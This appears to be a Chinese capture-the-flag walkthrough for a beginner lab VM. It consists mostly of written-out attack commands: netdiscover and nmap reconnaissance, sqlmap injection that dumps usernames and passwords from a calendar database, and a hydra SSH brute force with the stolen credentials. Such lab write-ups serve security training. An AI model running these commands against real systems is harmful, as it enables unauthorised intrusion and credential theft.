虚拟机简介：该练习的目的是在不知道用户名和密码的情况下破坏目标。请注意，还有其他捕获标记练习

目标：1个flag

级别：初级

1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.158
查看开放端口为22、25、80

3、WEB渗透测试

3.1 使用burp的activescan进行网站测试

http://192.168.207.158/index.html?page=blog&title=Blog&id=2
检测到有SQL注入

3.2 使用sqlmap进行爆破测试

sqlmap -u "http://192.168.207.158/index.html?page=blog&title=Blog&id=2" --dbs --batch

3.3 获取calendar信息

sqlmap -u "http://192.168.207.158/index.html?page=blog&title=Blog&id=2" -D calendar --tables --batch

3.4 获取phpc_users信息

sqlmap -u "http://192.168.207.158/index.html?page=blog&title=Blog&id=2" -D calendar -T phpc_users --columns 

3.5 获取用户名密码

sqlmap -u "http://192.168.207.158/index.html?page=blog&title=Blog&id=2" -D calendar -T phpc_users -C username,password --dump

3.6 使用获取到的用户名密码进行爆破

hydra -L username.txt -P password.txt ssh://192.168.207.158
